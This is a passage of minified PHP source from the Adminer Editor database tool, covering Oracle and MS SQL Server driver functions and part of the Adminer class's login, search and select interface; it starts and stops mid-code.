AND c_list.R_CONSTRAINT_NAME = c_dest.CONSTRAINT_NAME
AND c_list.CONSTRAINT_TYPE = 'R'
AND c_src.TABLE_NAME = ".q($R);foreach(get_rows($F)as$I)$H[$I['NAME']]=array("db"=>$I['DEST_DB'],"table"=>$I['DEST_TABLE'],"source"=>array($I['SRC_COLUMN']),"target"=>array($I['DEST_COLUMN']),"on_delete"=>$I['ON_DELETE'],"on_update"=>null,);return$H;}function
truncate_tables($T){return
apply_queries("TRUNCATE TABLE",$T);}function
drop_views($fh){return
apply_queries("DROP VIEW",$fh);}function
drop_tables($T){return
apply_queries("DROP TABLE",$T);}function
last_id($G){return
0;}function
schemas(){$H=get_vals("SELECT DISTINCT owner FROM dba_segments WHERE owner IN (SELECT username FROM dba_users WHERE default_tablespace NOT IN ('SYSTEM','SYSAUX')) ORDER BY 1");return($H?:get_vals("SELECT DISTINCT owner FROM all_tables WHERE tablespace_name = ".q(DB)." ORDER BY 1"));}function
get_schema(){return
get_val("SELECT sys_context('USERENV', 'SESSION_USER') FROM dual");}function
set_schema($Df,$h=null){if(!$h)$h=connection();return$h->query("ALTER SESSION SET CURRENT_SCHEMA = ".idf_escape($Df));}function
show_variables(){return
get_rows('SELECT name, display_value FROM v$parameter');}function
show_status(){$H=array();$J=get_rows('SELECT * FROM v$instance');foreach(reset($J)as$w=>$X)$H[]=array($w,$X);return$H;}function
process_list(){return
get_rows('SELECT
	sess.process AS "process",
	sess.username AS "user",
	sess.schemaname AS "schema",
	sess.status AS "status",
	sess.wait_class AS "wait_class",
	sess.seconds_in_wait AS "seconds_in_wait",
	sql.sql_text AS "sql_text",
	sess.machine AS "machine",
	sess.port AS "port"
FROM v$session sess LEFT OUTER JOIN v$sql sql
ON sql.sql_id = sess.sql_id
WHERE sess.type = \'USER\'
ORDER BY PROCESS
');}function
convert_field($l){}function
unconvert_field($l,$H){return$H;}function
support($jc){return
preg_match('~^(columns|database|drop_col|indexes|descidx|processlist|scheme|sql|status|table|variables|view)$~',$jc);}}add_driver("mssql","MS SQL");if(isset($_GET["mssql"])){define('Adminer\DRIVER',"mssql");if(extension_loaded("sqlsrv")&&$_GET["ext"]!="pdo"){class
Db
extends
SqlDb{var$extension="sqlsrv";private$link,$result;private
function
get_error(){$this->error="";foreach(sqlsrv_errors()as$k){$this->errno=$k["code"];$this->error
.="$k[message]\n";}$this->error=rtrim($this->error);}function
attach($M,$V,$D){$fb=array("UID"=>$V,"PWD"=>$D,"CharacterSet"=>"UTF-8");$O=adminer()->connectSsl();if(isset($O["Encrypt"]))$fb["Encrypt"]=$O["Encrypt"];if(isset($O["TrustServerCertificate"]))$fb["TrustServerCertificate"]=$O["TrustServerCertificate"];$i=adminer()->database();if($i!="")$fb["Database"]=$i;$this->link=@sqlsrv_connect(preg_replace('~:~',',',$M),$fb);if($this->link){$jd=sqlsrv_server_info($this->link);$this->server_info=$jd['SQLServerVersion'];}else$this->get_error();return($this->link?'':$this->error);}function
quote($Q){$Ng=strlen($Q)!=strlen(utf8_decode($Q));return($Ng?"N":"")."'".str_replace("'","''",$Q)."'";}function
select_db($tb){return$this->query(use_sql($tb));}function
query($F,$Mg=false){$G=sqlsrv_query($this->link,$F);$this->error="";if(!$G){$this->get_error();return
false;}return$this->store_result($G);}function
multi_query($F){$this->result=sqlsrv_query($this->link,$F);$this->error="";if(!$this->result){$this->get_error();return
false;}return
true;}function
store_result($G=null){if(!$G)$G=$this->result;if(!$G)return
false;if(sqlsrv_field_metadata($G))return
new
Result($G);$this->affected_rows=sqlsrv_rows_affected($G);return
true;}function
next_result(){return$this->result?!!sqlsrv_next_result($this->result):false;}}class
Result{var$num_rows;private$result,$offset=0,$fields;function
__construct($G){$this->result=$G;}private
function
convert($I){foreach((array)$I
as$w=>$X){if(is_a($X,'DateTime'))$I[$w]=$X->format("Y-m-d H:i:s");}return$I;}function
fetch_assoc(){return$this->convert(sqlsrv_fetch_array($this->result,SQLSRV_FETCH_ASSOC));}function
fetch_row(){return$this->convert(sqlsrv_fetch_array($this->result,SQLSRV_FETCH_NUMERIC));}function
fetch_field(){if(!$this->fields)$this->fields=sqlsrv_field_metadata($this->result);$l=$this->fields[$this->offset++];$H=new
\stdClass;$H->name=$l["Name"];$H->type=($l["Type"]==1?254:15);$H->charsetnr=0;return$H;}function
seek($re){for($r=0;$r<$re;$r++)sqlsrv_fetch($this->result);}function
__destruct(){sqlsrv_free_stmt($this->result);}}function
last_id($G){return
get_val("SELECT SCOPE_IDENTITY()");}function
explain($g,$F){$g->query("SET SHOWPLAN_ALL ON");$H=$g->query($F);$g->query("SET SHOWPLAN_ALL OFF");return$H;}}else{abstract
class
MssqlDb
extends
PdoDb{function
select_db($tb){return$this->query(use_sql($tb));}function
lastInsertId(){return$this->pdo->lastInsertId();}}function
last_id($G){return
connection()->lastInsertId();}function
explain($g,$F){}if(extension_loaded("pdo_sqlsrv")){class
Db
extends
MssqlDb{var$extension="PDO_SQLSRV";function
attach($M,$V,$D){return$this->dsn("sqlsrv:Server=".str_replace(":",",",$M),$V,$D);}}}elseif(extension_loaded("pdo_dblib")){class
Db
extends
MssqlDb{var$extension="PDO_DBLIB";function
attach($M,$V,$D){return$this->dsn("dblib:charset=utf8;host=".str_replace(":",";unix_socket=",preg_replace('~:(\d)~',';port=\1',$M)),$V,$D);}}}}class
Driver
extends
SqlDriver{static$extensions=array("SQLSRV","PDO_SQLSRV","PDO_DBLIB");static$jush="mssql";var$insertFunctions=array("date|time"=>"getdate");var$editFunctions=array("int|decimal|real|float|money|datetime"=>"+/-","char|text"=>"+",);var$operators=array("=","<",">","<=",">=","!=","LIKE","LIKE %%","IN","IS NULL","NOT LIKE","NOT IN","IS NOT NULL");var$functions=array("len","lower","round","upper");var$grouping=array("avg","count","count distinct","max","min","sum");var$generated=array("PERSISTED","VIRTUAL");var$onActions="NO ACTION|CASCADE|SET NULL|SET DEFAULT";static
function
connect($M,$V,$D){if($M=="")$M="localhost:1433";return
parent::connect($M,$V,$D);}function
__construct(Db$g){parent::__construct($g);$this->types=array(lang(25)=>array("tinyint"=>3,"smallint"=>5,"int"=>10,"bigint"=>20,"bit"=>1,"decimal"=>0,"real"=>12,"float"=>53,"smallmoney"=>10,"money"=>20),lang(26)=>array("date"=>10,"smalldatetime"=>19,"datetime"=>19,"datetime2"=>19,"time"=>8,"datetimeoffset"=>10),lang(27)=>array("char"=>8000,"varchar"=>8000,"text"=>2147483647,"nchar"=>4000,"nvarchar"=>4000,"ntext"=>1073741823),lang(28)=>array("binary"=>8000,"varbinary"=>8000,"image"=>2147483647),);}function
insertUpdate($R,array$J,array$E){$m=fields($R);$Ug=array();$Z=array();$N=reset($J);$e="c".implode(", c",range(1,count($N)));$Ia=0;$nd=array();foreach($N
as$w=>$X){$Ia++;$_=idf_unescape($w);if(!$m[$_]["auto_increment"])$nd[$w]="c$Ia";if(isset($E[$_]))$Z[]="$w = c$Ia";else$Ug[]="$w = c$Ia";}$bh=array();foreach($J
as$N)$bh[]="(".implode(", ",$N).")";if($Z){$bd=queries("SET IDENTITY_INSERT ".table($R)." ON");$H=queries("MERGE ".table($R)." USING (VALUES\n\t".implode(",\n\t",$bh)."\n) AS source ($e) ON ".implode(" AND ",$Z).($Ug?"\nWHEN MATCHED THEN UPDATE SET ".implode(", ",$Ug):"")."\nWHEN NOT MATCHED THEN INSERT (".implode(", ",array_keys($bd?$N:$nd)).") VALUES (".($bd?$e:implode(", ",$nd)).");");if($bd)queries("SET IDENTITY_INSERT ".table($R)." OFF");}else$H=queries("INSERT INTO ".table($R)." (".implode(", ",array_keys($N)).") VALUES\n".implode(",\n",$bh));return$H;}function
begin(){return
queries("BEGIN TRANSACTION");}function
tableHelp($_,$wd=false){$Ld=array("sys"=>"catalog-views/sys-","INFORMATION_SCHEMA"=>"information-schema-views/",);$y=$Ld[get_schema()];if($y)return"relational-databases/system-$y".preg_replace('~_~','-',strtolower($_))."-transact-sql";}}function
idf_escape($t){return"[".str_replace("]","]]",$t)."]";}function
table($t){return($_GET["ns"]!=""?idf_escape($_GET["ns"]).".":"").idf_escape($t);}function
get_databases($uc){return
get_vals("SELECT name FROM sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb')");}function
limit($F,$Z,$x,$re=0,$L=" "){return($x?" TOP (".($x+$re).")":"")." $F$Z";}function
limit1($R,$F,$Z,$L="\n"){return
limit($F,$Z,1,0,$L);}function
db_collation($i,$Wa){return
get_val("SELECT collation_name FROM sys.databases WHERE name = ".q($i));}function
logged_user(){return
get_val("SELECT SUSER_NAME()");}function
tables_list(){return
get_key_vals("SELECT name, type_desc FROM sys.all_objects WHERE schema_id = SCHEMA_ID(".q(get_schema()).") AND type IN ('S', 'U', 'V') ORDER BY name");}function
count_tables($ub){$H=array();foreach($ub
as$i){connection()->select_db($i);$H[$i]=get_val("SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES");}return$H;}function
table_status($_=""){$H=array();foreach(get_rows("SELECT ao.name AS Name, ao.type_desc AS Engine, (SELECT value FROM fn_listextendedproperty(default, 'SCHEMA', schema_name(schema_id), 'TABLE', ao.name, null, null)) AS Comment
FROM sys.all_objects AS ao
WHERE schema_id = SCHEMA_ID(".q(get_schema()).") AND type IN ('S', 'U', 'V') ".($_!=""?"AND name = ".q($_):"ORDER BY name"))as$I)$H[$I["Name"]]=$I;return$H;}function
is_view($S){return$S["Engine"]=="VIEW";}function
fk_support($S){return
true;}function
fields($R){$bb=get_key_vals("SELECT objname, cast(value as varchar(max)) FROM fn_listextendedproperty('MS_DESCRIPTION', 'schema', ".q(get_schema()).", 'table', ".q($R).", 'column', NULL)");$H=array();$jg=get_val("SELECT object_id FROM sys.all_objects WHERE schema_id = SCHEMA_ID(".q(get_schema()).") AND type IN ('S', 'U', 'V') AND name = ".q($R));foreach(get_rows("SELECT c.max_length, c.precision, c.scale, c.name, c.is_nullable, c.is_identity, c.collation_name, t.name type, d.definition [default], d.name default_constraint, i.is_primary_key
FROM sys.all_columns c
JOIN sys.types t ON c.user_type_id = t.user_type_id
LEFT JOIN sys.default_constraints d ON c.default_object_id = d.object_id
LEFT JOIN sys.index_columns ic ON c.object_id = ic.object_id AND c.column_id = ic.column_id
LEFT JOIN sys.indexes i ON ic.object_id = i.object_id AND ic.index_id = i.index_id
WHERE c.object_id = ".q($jg))as$I){$U=$I["type"];$Id=(preg_match("~char|binary~",$U)?intval($I["max_length"])/($U[0]=='n'?2:1):($U=="decimal"?"$I[precision],$I[scale]":""));$H[$I["name"]]=array("field"=>$I["name"],"full_type"=>$U.($Id?"($Id)":""),"type"=>$U,"length"=>$Id,"default"=>(preg_match("~^\('(.*)'\)$~",$I["default"],$z)?str_replace("''","'",$z[1]):$I["default"]),"default_constraint"=>$I["default_constraint"],"null"=>$I["is_nullable"],"auto_increment"=>$I["is_identity"],"collation"=>$I["collation_name"],"privileges"=>array("insert"=>1,"select"=>1,"update"=>1,"where"=>1,"order"=>1),"primary"=>$I["is_primary_key"],"comment"=>$bb[$I["name"]],);}foreach(get_rows("SELECT * FROM sys.computed_columns WHERE object_id = ".q($jg))as$I){$H[$I["name"]]["generated"]=($I["is_persisted"]?"PERSISTED":"VIRTUAL");$H[$I["name"]]["default"]=$I["definition"];}return$H;}function
indexes($R,$h=null){$H=array();foreach(get_rows("SELECT i.name, key_ordinal, is_unique, is_primary_key, c.name AS column_name, is_descending_key
FROM sys.indexes i
INNER JOIN sys.index_columns ic ON i.object_id = ic.object_id AND i.index_id = ic.index_id
INNER JOIN sys.columns c ON ic.object_id = c.object_id AND ic.column_id = c.column_id
WHERE OBJECT_NAME(i.object_id) = ".q($R),$h)as$I){$_=$I["name"];$H[$_]["type"]=($I["is_primary_key"]?"PRIMARY":($I["is_unique"]?"UNIQUE":"INDEX"));$H[$_]["lengths"]=array();$H[$_]["columns"][$I["key_ordinal"]]=$I["column_name"];$H[$_]["descs"][$I["key_ordinal"]]=($I["is_descending_key"]?'1':null);}return$H;}function
view($_){return
array("select"=>preg_replace('~^(?:[^[]|\[[^]]*])*\s+AS\s+~isU','',get_val("SELECT VIEW_DEFINITION FROM INFORMATION_SCHEMA.VIEWS WHERE TABLE_SCHEMA = SCHEMA_NAME() AND TABLE_NAME = ".q($_))));}function
collations(){$H=array();foreach(get_vals("SELECT name FROM fn_helpcollations()")as$c)$H[preg_replace('~_.*~','',$c)][]=$c;return$H;}function
information_schema($i){return
get_schema()=="INFORMATION_SCHEMA";}function
error(){return
nl_br(h(preg_replace('~^(\[[^]]*])+~m','',connection()->error)));}function
create_database($i,$c){return
queries("CREATE DATABASE ".idf_escape($i).(preg_match('~^[a-z0-9_]+$~i',$c)?" COLLATE $c":""));}function
drop_databases($ub){return
queries("DROP DATABASE ".implode(", ",array_map('Adminer\idf_escape',$ub)));}function
rename_database($_,$c){if(preg_match('~^[a-z0-9_]+$~i',$c))queries("ALTER DATABASE ".idf_escape(DB)." COLLATE $c");queries("ALTER DATABASE ".idf_escape(DB)." MODIFY NAME = ".idf_escape($_));return
true;}function
auto_increment(){return" IDENTITY".($_POST["Auto_increment"]!=""?"(".number($_POST["Auto_increment"]).",1)":"")." PRIMARY KEY";}function
alter_table($R,$_,$m,$wc,$ab,$Sb,$c,$ta,$Se){$b=array();$bb=array();$Ge=fields($R);foreach($m
as$l){$d=idf_escape($l[0]);$X=$l[1];if(!$X)$b["DROP"][]=" COLUMN $d";else{$X[1]=preg_replace("~( COLLATE )'(\\w+)'~",'\1\2',$X[1]);$bb[$l[0]]=$X[5];unset($X[5]);if(preg_match('~ AS ~',$X[3]))unset($X[1],$X[2]);if($l[0]=="")$b["ADD"][]="\n  ".implode("",$X).($R==""?substr($wc[$X[0]],16+strlen($X[0])):"");else{$j=$X[3];unset($X[3]);unset($X[6]);if($d!=$X[0])queries("EXEC sp_rename ".q(table($R).".$d").", ".q(idf_unescape($X[0])).", 'COLUMN'");$b["ALTER COLUMN ".implode("",$X)][]="";$Fe=$Ge[$l[0]];if(default_value($Fe)!=$j){if($Fe["default"]!==null)$b["DROP"][]=" ".idf_escape($Fe["default_constraint"]);if($j)$b["ADD"][]="\n $j FOR $d";}}}}if($R=="")return
queries("CREATE TABLE ".table($_)." (".implode(",",(array)$b["ADD"])."\n)");if($R!=$_)queries("EXEC sp_rename ".q(table($R)).", ".q($_));if($wc)$b[""]=$wc;foreach($b
as$w=>$X){if(!queries("ALTER TABLE ".table($_)." $w".implode(",",$X)))return
false;}foreach($bb
as$w=>$X){$ab=substr($X,9);queries("EXEC sp_dropextendedproperty @name = N'MS_Description', @level0type = N'Schema', @level0name = ".q(get_schema()).", @level1type = N'Table', @level1name = ".q($_).", @level2type = N'Column', @level2name = ".q($w));queries("EXEC sp_addextendedproperty
@name = N'MS_Description',
@value = $ab,
@level0type = N'Schema',
@level0name = ".q(get_schema()).",
@level1type = N'Table',
@level1name = ".q($_).",
@level2type = N'Column',
@level2name = ".q($w));}return
true;}function
alter_indexes($R,$b){$u=array();$Gb=array();foreach($b
as$X){if($X[2]=="DROP"){if($X[0]=="PRIMARY")$Gb[]=idf_escape($X[1]);else$u[]=idf_escape($X[1])." ON ".table($R);}elseif(!queries(($X[0]!="PRIMARY"?"CREATE $X[0] ".($X[0]!="INDEX"?"INDEX ":"").idf_escape($X[1]!=""?$X[1]:uniqid($R."_"))." ON ".table($R):"ALTER TABLE ".table($R)." ADD PRIMARY KEY")." (".implode(", ",$X[2]).")"))return
false;}return(!$u||queries("DROP INDEX ".implode(", ",$u)))&&(!$Gb||queries("ALTER TABLE ".table($R)." DROP ".implode(", ",$Gb)));}function
found_rows($S,$Z){}function
foreign_keys($R){$H=array();$ve=array("CASCADE","NO ACTION","SET NULL","SET DEFAULT");foreach(get_rows("EXEC sp_fkeys @fktable_name = ".q($R).", @fktable_owner = ".q(get_schema()))as$I){$o=&$H[$I["FK_NAME"]];$o["db"]=$I["PKTABLE_QUALIFIER"];$o["ns"]=$I["PKTABLE_OWNER"];$o["table"]=$I["PKTABLE_NAME"];$o["on_update"]=$ve[$I["UPDATE_RULE"]];$o["on_delete"]=$ve[$I["DELETE_RULE"]];$o["source"][]=$I["FKCOLUMN_NAME"];$o["target"][]=$I["PKCOLUMN_NAME"];}return$H;}function
truncate_tables($T){return
apply_queries("TRUNCATE TABLE",$T);}function
drop_views($fh){return
queries("DROP VIEW ".implode(", ",array_map('Adminer\table',$fh)));}function
drop_tables($T){return
queries("DROP TABLE ".implode(", ",array_map('Adminer\table',$T)));}function
move_tables($T,$fh,$mg){return
apply_queries("ALTER SCHEMA ".idf_escape($mg)." TRANSFER",array_merge($T,$fh));}function
trigger($_,$R){if($_=="")return
array();$J=get_rows("SELECT s.name [Trigger],
CASE WHEN OBJECTPROPERTY(s.id, 'ExecIsInsertTrigger') = 1 THEN 'INSERT' WHEN OBJECTPROPERTY(s.id, 'ExecIsUpdateTrigger') = 1 THEN 'UPDATE' WHEN OBJECTPROPERTY(s.id, 'ExecIsDeleteTrigger') = 1 THEN 'DELETE' END [Event],
CASE WHEN OBJECTPROPERTY(s.id, 'ExecIsInsteadOfTrigger') = 1 THEN 'INSTEAD OF' ELSE 'AFTER' END [Timing],
c.text
FROM sysobjects s
JOIN syscomments c ON s.id = c.id
WHERE s.xtype = 'TR' AND s.name = ".q($_));$H=reset($J);if($H)$H["Statement"]=preg_replace('~^.+\s+AS\s+~isU','',$H["text"]);return$H;}function
triggers($R){$H=array();foreach(get_rows("SELECT sys1.name,
CASE WHEN OBJECTPROPERTY(sys1.id, 'ExecIsInsertTrigger') = 1 THEN 'INSERT' WHEN OBJECTPROPERTY(sys1.id, 'ExecIsUpdateTrigger') = 1 THEN 'UPDATE' WHEN OBJECTPROPERTY(sys1.id, 'ExecIsDeleteTrigger') = 1 THEN 'DELETE' END [Event],
CASE WHEN OBJECTPROPERTY(sys1.id, 'ExecIsInsteadOfTrigger') = 1 THEN 'INSTEAD OF' ELSE 'AFTER' END [Timing]
FROM sysobjects sys1
JOIN sysobjects sys2 ON sys1.parent_obj = sys2.id
WHERE sys1.xtype = 'TR' AND sys2.name = ".q($R))as$I)$H[$I["name"]]=array($I["Timing"],$I["Event"]);return$H;}function
trigger_options(){return
array("Timing"=>array("AFTER","INSTEAD OF"),"Event"=>array("INSERT","UPDATE","DELETE"),"Type"=>array("AS"),);}function
schemas(){return
get_vals("SELECT name FROM sys.schemas");}function
get_schema(){if($_GET["ns"]!="")return$_GET["ns"];return
get_val("SELECT SCHEMA_NAME()");}function
set_schema($Cf){$_GET["ns"]=$Cf;return
true;}function
create_sql($R,$ta,$dg){if(is_view(table_status1($R))){$eh=view($R);return"CREATE VIEW ".table($R)." AS $eh[select]";}$m=array();$E=false;foreach(fields($R)as$_=>$l){$X=process_field($l,$l);if($X[6])$E=true;$m[]=implode("",$X);}foreach(indexes($R)as$_=>$u){if(!$E||$u["type"]!="PRIMARY"){$e=array();foreach($u["columns"]as$w=>$X)$e[]=idf_escape($X).($u["descs"][$w]?" DESC":"");$_=idf_escape($_);$m[]=($u["type"]=="INDEX"?"INDEX $_":"CONSTRAINT $_ ".($u["type"]=="UNIQUE"?"UNIQUE":"PRIMARY KEY"))." (".implode(", ",$e).")";}}foreach(driver()->checkConstraints($R)as$_=>$Ma)$m[]="CONSTRAINT ".idf_escape($_)." CHECK ($Ma)";return"CREATE TABLE ".table($R)." (\n\t".implode(",\n\t",$m)."\n)";}function
foreign_keys_sql($R){$m=array();foreach(foreign_keys($R)as$wc)$m[]=ltrim(format_foreign_key($wc));return($m?"ALTER TABLE ".table($R)." ADD\n\t".implode(",\n\t",$m).";\n\n":"");}function
truncate_sql($R){return"TRUNCATE TABLE ".table($R);}function
use_sql($tb){return"USE ".idf_escape($tb);}function
trigger_sql($R){$H="";foreach(triggers($R)as$_=>$Gg)$H
.=create_trigger(" ON ".table($R),trigger($_,$R)).";";return$H;}function
convert_field($l){}function
unconvert_field($l,$H){return$H;}function
support($jc){return
preg_match('~^(check|comment|columns|database|drop_col|dump|indexes|descidx|scheme|sql|table|trigger|view|view_trigger)$~',$jc);}}class
Adminer{static$instance;var$error='';private$values=array();function
name(){return"<a href='https://www.adminer.org/editor/'".target_blank()." id='h1'><img src='".h(preg_replace("~\\?.*~","",ME)."?file=logo.png&version=5.3.0")."' width='24' height='24' alt='' id='logo'>".lang(32)."</a>";}function
credentials(){return
array(SERVER,$_GET["username"],get_password());}function
connectSsl(){}function
permanentLogin($lb=false){return
password_file($lb);}function
bruteForceKey(){return$_SERVER["REMOTE_ADDR"];}function
serverName($M){}function
database(){if(connection()){$ub=adminer()->databases(false);return(!$ub?get_val("SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1)"):$ub[(information_schema($ub[0])?1:0)]);}}function
operators(){return
array("<=",">=");}function
schemas(){return
schemas();}function
databases($uc=true){return
get_databases($uc);}function
pluginsLinks(){}function
queryTimeout(){return
5;}function
headers(){}function
csp($ob){return$ob;}function
head($rb=null){return
true;}function
bodyClass(){echo" editor";}function
css(){$H=array();foreach(array("","-dark")as$ee){$n="adminer$ee.css";if(file_exists($n)){$mc=file_get_contents($n);$H["$n?v=".crc32($mc)]=($ee?"dark":(preg_match('~prefers-color-scheme:\s*dark~',$mc)?'':'light'));}}return$H;}function
loginForm(){echo"<table class='layout'>\n",adminer()->loginFormField('username','<tr><th>'.lang(33).'<td>',input_hidden("auth[driver]","server").'<input name="auth[username]" autofocus value="'.h($_GET["username"]).'" autocomplete="username" autocapitalize="off">'),adminer()->loginFormField('password','<tr><th>'.lang(34).'<td>','<input type="password" name="auth[password]" autocomplete="current-password">'),"</table>\n","<p><input type='submit' value='".lang(35)."'>\n",checkbox("auth[permanent]",1,$_COOKIE["adminer_permanent"],lang(36))."\n";}function
loginFormField($_,$Sc,$Y){return$Sc.$Y."\n";}function
login($Nd,$D){return
true;}function
tableName($ig){return
h(isset($ig["Engine"])?($ig["Comment"]!=""?$ig["Comment"]:$ig["Name"]):"");}function
fieldName($l,$Ce=0){return
h(preg_replace('~\s+\[.*\]$~','',($l["comment"]!=""?$l["comment"]:$l["field"])));}function
selectLinks($ig,$N=""){$a=$ig["Name"];if($N!==null)echo'<p class="tabs"><a href="'.h(ME.'edit='.urlencode($a).$N).'">'.lang(37)."</a>\n";}function
foreignKeys($R){return
foreign_keys($R);}function
backwardKeys($R,$hg){$H=array();foreach(get_rows("SELECT TABLE_NAME, CONSTRAINT_NAME, COLUMN_NAME, REFERENCED_COLUMN_NAME
FROM information_schema.KEY_COLUMN_USAGE
WHERE TABLE_SCHEMA = ".q(adminer()->database())."
AND REFERENCED_TABLE_SCHEMA = ".q(adminer()->database())."
AND REFERENCED_TABLE_NAME = ".q($R)."
ORDER BY ORDINAL_POSITION",null,"")as$I)$H[$I["TABLE_NAME"]]["keys"][$I["CONSTRAINT_NAME"]][$I["COLUMN_NAME"]]=$I["REFERENCED_COLUMN_NAME"];foreach($H
as$w=>$X){$_=adminer()->tableName(table_status1($w,true));if($_!=""){$Ef=preg_quote($hg);$L="(:|\\s*-)?\\s+";$H[$w]["name"]=(preg_match("(^$Ef$L(.+)|^(.+?)$L$Ef\$)iu",$_,$z)?$z[2].$z[3]:$_);}else
unset($H[$w]);}return$H;}function
backwardKeysPrint($ya,$I){foreach($ya
as$R=>$xa){foreach($xa["keys"]as$Xa){$y=ME.'select='.urlencode($R);$r=0;foreach($Xa
as$d=>$X)$y
.=where_link($r++,$d,$I[$X]);echo"<a href='".h($y)."'>".h($xa["name"])."</a>";$y=ME.'edit='.urlencode($R);foreach($Xa
as$d=>$X)$y
.="&set".urlencode("[".bracket_escape($d)."]")."=".urlencode($I[$X]);echo"<a href='".h($y)."' title='".lang(37)."'>+</a> ";}}}function
selectQuery($F,$bg,$hc=false){return"<!--\n".str_replace("--","--><!-- ",$F)."\n(".format_time($bg).")\n-->\n";}function
rowDescription($R){foreach(fields($R)as$l){if(preg_match("~varchar|character varying~",$l["type"]))return
idf_escape($l["field"]);}return"";}function
rowDescriptions($J,$yc){$H=$J;foreach($J[0]as$w=>$X){if(list($R,$s,$_)=$this->_foreignColumn($yc,$w)){$cd=array();foreach($J
as$I)$cd[$I[$w]]=q($I[$w]);$_b=$this->values[$R];if(!$_b)$_b=get_key_vals("SELECT $s, $_ FROM ".table($R)." WHERE $s IN (".implode(", ",$cd).")");foreach($J
as$ie=>$I){if(isset($I[$w]))$H[$ie][$w]=(string)$_b[$I[$w]];}}}return$H;}function
selectLink($X,$l){}function
selectVal($X,$y,$l,$He){$H=$X;$y=h($y);if(preg_match('~blob|bytea~',$l["type"])&&!is_utf8($X)){$H=lang(38,strlen($He));if(preg_match("~^(GIF|\xFF\xD8\xFF|\x89PNG\x0D\x0A\x1A\x0A)~",$He))$H="<img src='$y' alt='$H'>";}if(like_bool($l)&&$H!="")$H=(preg_match('~^(1|t|true|y|yes|on)$~i',$X)?lang(39):lang(40));if($y)$H="<a href='$y'".(is_url($y)?target_blank():"").">$H</a>";if(preg_match('~date~',$l["type"]))$H="<div class='datetime'>$H</div>";return$H;}function
editVal($X,$l){if(preg_match('~date|timestamp~',$l["type"])&&$X!==null)return
preg_replace('~^(\d{2}(\d+))-(0?(\d+))-(0?(\d+))~',lang(41),$X);return$X;}function
config(){return
array();}function
selectColumnsPrint($K,$e){}function
selectSearchPrint($Z,$e,$v){$Z=(array)$_GET["where"];echo'<fieldset id="fieldset-search"><legend>'.lang(42)."</legend><div>\n";$_d=array();foreach($Z
as$w=>$X)$_d[$X["col"]]=$w;$r=0;$m=fields($_GET["select"]);foreach($e
as$_=>$zb){$l=$m[$_];if(preg_match("~enum~",$l["type"])||like_bool($l)){$w=$_d[$_];$r--;echo"<div>".h($zb).":".input_hidden("where[$r][col]",$_);$X=idx($Z[$w],"val");echo(like_bool($l)?"<select name='where[$r][val]'>".optionlist(array(""=>"",lang(40),lang(39)),$X,true)."</select>":enum_input("checkbox"," name='where[$r][val][]'",$l,(array)$X,($l["null"]?0:null))),"</div>\n";unset($e[$_]);}elseif(is_array($B=$this->foreignKeyOptions($_GET["select"],$_))){if($m[$_]["null"])$B[0]='('.lang(7).')';$w=$_d[$_];$r--;echo"<div>".h($zb).input_hidden("where[$r][col]",$_).input_hidden("where[$r][op]","=").": <select name='where[$r][val]'>".optionlist($B,idx($Z[$w],"val"),true)."</select></div>\n";unset($e[$_]);}}$r=0;foreach($Z
as$X){if(($X["col"]==""||$e[$X["col"]])&&"$X[col]$X[val]"!=""){echo"<div><select name='where[$r][col]'><option value=''>(".lang(43).")".optionlist($e,$X["col"],true)."</select>",html_select("where[$r][op]",array(-1=>"")+adminer()->operators(),$X["op"]),"<input type='search' name='where[$r][val]' value='".h($X["val"])."'>".script("mixin(qsl('input'), {onkeydown: selectSearchKeydown, onsearch: selectSearchSearch});","")."</div>\n";$r++;}}echo"<div><select name='where[$r][col]'><option value=''>(".lang(43).")".optionlist($e,null,true)."</select>",script("qsl('select').onchange = selectAddRow;",""),html_select("where[$r][op]",array(-1=>"")+adminer()->operators()),"<input type='search' name='where[$r][val]'></div>",script("mixin(qsl('input'), {onchange: function () { this.parentNode.firstChild.onchange(); }, onsearch: selectSearchSearch});"),"</div></fieldset>\n";}function
selectOrderPrint($Ce,$e,$v){$Ee=array();foreach($v
as$w=>$u){$Ce=array();foreach($u["columns"]as$X)$Ce[]=$e[$X];if(count(array_filter($Ce,'strlen'))>1&&$w!="PRIMARY")$Ee[$w]=implode(", ",$Ce);}if($Ee)echo'<fieldset><legend>'.lang(44)."</legend><div>","<select name='index_order'>".optionlist(array(""=>"")+$Ee,(idx($_GET["order"],0)!=""?"":$_GET["index_order"]),true)."</select>","</div></fieldset>\n";if($_GET["order"])echo"<div style='display: none;'>".hidden_fields(array("order"=>array(1=>reset($_GET["order"])),"desc"=>($_GET["desc"]?array(1=>1):array()),))."</div>\n";}function
selectLimitPrint($x){echo"<fieldset><legend>".lang(45)."</legend><div>",html_select("limit",array("",50,100),$x),"</div></fieldset>\n";}function
selectLengthPrint($qg){}function
selectActionPrint($v){echo"<fieldset><legend>".lang(46)."</legend><div>","<input type='submit' value='".lang(47)."'>","</div></fieldset>\n";}function
selectCommandPrint(){return
true;}function
selectImportPrint(){return
true;}function
selectEmailPrint($Pb,$e){}function
selectColumnsProcess($e,$v){return
array(array(),array());}function
selectSearchProcess($m,$v){$H=array();foreach((array)$_GET["where"]as$w=>$Z){$Va=$Z["col"];$ye=$Z["op"];$X=$Z["val"];if(($w>=0&&$Va!="")||$X!=""){$cb=array();foreach(($Va!=""?array($Va=>$m[$Va]):$m)as$_=>$l){if($Va!=""||is_numeric($X)||!preg_match(number_type(),$l["type"])){$_=idf_escape($_);if($Va!=""&&$l["type"]=="enum")$cb[]=(in_array(0,$X)?"$_ IS NULL OR ":"")."$_ IN (".implode(", ",array_map('Adminer\q',$X)).")";else{$rg=preg_match('~char|text|enum|set~',$l["type"]);$Y=adminer()->processInput($l,(!$ye&&$rg&&preg_match('~^[^%]+$~',$X)?"%$X%":$X));$cb[]=driver()->convertSearch($_,$Z,$l).($Y=="NULL"?" IS".($ye==">="?" NOT":"")." $Y":(in_array($ye,adminer()->operators())||$ye=="="?" $ye $Y":($rg?" LIKE $Y":" IN (".($Y[0]=="'"?str_replace(",","', '",$Y):$Y).")")));if($w<0&&$X=="0")$cb[]="$_ IS NULL";}}}$H[]=($cb?"(".implode(" OR ",$cb).")":"1 = 0");}}return$H;}function
selectOrderProcess($m,$v){$gd=$_GET["index_order"];if($gd!="")unset($_GET["order"][1]);if($_GET["order"])return
